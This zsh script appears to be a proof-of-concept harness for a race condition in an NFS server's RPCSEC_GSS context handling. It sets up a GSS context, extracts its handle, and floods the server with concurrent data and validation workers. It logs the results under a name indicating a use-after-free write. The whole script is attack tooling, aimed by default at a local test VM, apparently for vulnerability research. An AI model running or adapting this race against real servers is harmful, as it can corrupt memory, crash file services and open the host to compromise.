#!/bin/zsh
set -eu

HERE=${0:A:h}
HOST=${1:-192.168.64.81}
SERVICE=${2:-nfs@tests-virtual-machine.local}
DATA_WORKERS=${DATA_WORKERS:-128}
VALID_WORKERS=${VALID_WORKERS:-8}
ROUNDS=${ROUNDS:-100}
STAMP=$(date -u +%Y%m%dT%H%M%SZ)
TOKEN="${HERE}/bulk_client_token_${STAMP}.bin"
SERVER_TOKEN="${HERE}/bulk_server_token_${STAMP}.bin"
CONTEXT_LOG="${HERE}/bulk_context_${STAMP}.log"
RACE_LOG="${HERE}/bulk_uaf_write_${STAMP}.log"

context_output=$("${HERE}/rpc_gss_new_context" \
  "${HOST}" "${SERVICE}" "${TOKEN}" "${SERVER_TOKEN}" 0)
printf '%s\n' "${context_output}" | tee "${CONTEXT_LOG}"
handle=$(printf '%s\n' "${context_output}" |
  sed -n 's/^handle=\([0-9a-fA-F]*\).*/\1/p' | head -1)

if [[ -z "${handle}" ]]; then
  print -u2 "could not parse context handle"
  exit 1
fi

"${HERE}/rpc_gss_ctx_race" "${HOST}" "${handle}" race \
  --token-file "${TOKEN}" \
  --data "${DATA_WORKERS}" \
  --valid "${VALID_WORKERS}" \
  --invalid 0 \
  --rounds "${ROUNDS}" \
  --timeout-sec 3 \
  --quiet 1 \
  --ignore-data-reply-errors 1 \
  --stop-on-error 1 | tee "${RACE_LOG}"
